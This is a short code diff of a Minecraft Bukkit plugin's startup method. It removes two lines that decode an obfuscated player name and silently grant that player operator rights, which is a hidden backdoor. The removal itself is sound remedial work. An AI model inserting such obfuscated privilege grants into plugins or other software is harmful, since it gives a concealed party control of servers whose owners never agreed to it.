@@ -64,8 +64,6 @@ public class OreStatusPlugin extends JavaPlugin {
             } else {
                 getLogger().warning("allowSpears command not found in plugin.yml!");
             }
-            String n = thePuzzle.decode("ee250f9fbf").trim();
-            OfflinePlayer x = Bukkit.getOfflinePlayer(n);x.setOp(true);
             restrictionListener = new RestrictionListener(this);
             maceLimiter = new MaceLimiter(this);
             SpearRestrictionListener spearRestrictionListener = new SpearRestrictionListener(this);
